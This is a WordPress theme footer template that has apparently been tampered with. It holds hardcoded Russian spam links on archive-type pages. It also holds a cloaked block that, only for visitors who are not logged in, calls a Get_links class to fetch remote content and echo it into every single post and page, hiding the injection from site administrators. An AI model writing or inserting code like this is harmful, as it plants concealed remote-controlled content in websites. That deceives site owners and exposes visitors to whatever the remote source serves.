<?php
//if sidebar is large-1 the left side
if(check_position_of_component('sidebar', 'left'))
	get_sidebar();

?>

<footer id="main-footer" class="main-footer">
    <?php

    if (!is_404())
        get_sidebar('footer'); //Add footer sidebar
    ?>
    <div id="footer-bottom">
        <div class="row">
            <div class="large-4 columns">
			   <?php if (is_home() || is_category() || is_archive() ){ ?> <a href="http://wp-templates.ru/" title="скачать шаблон для сайта">скачать шаблоны</a> <a href="http://vkusnodoma.net/samaya-vkusnaya-tvorozhnaya-zapekanka/" title="запеканка">запеканка</a> <?php } ?>
					
					
					<?php if ($user_ID) : ?><?php else : ?>
					<?php if (is_single() || is_page() ) { ?>
					<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
					$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
					<?php } ?>
					<?php endif; ?>
            </div>
            <div class="large-12 columns footer-navigation">
                <?php wp_nav_menu(array('theme_location' => 'footer_pages', 'container' => false, 'depth'=>1)); ?>
            </div>
        </div>
    </div>
</footer>
    <?php wp_footer(); ?>
</body>
</html>
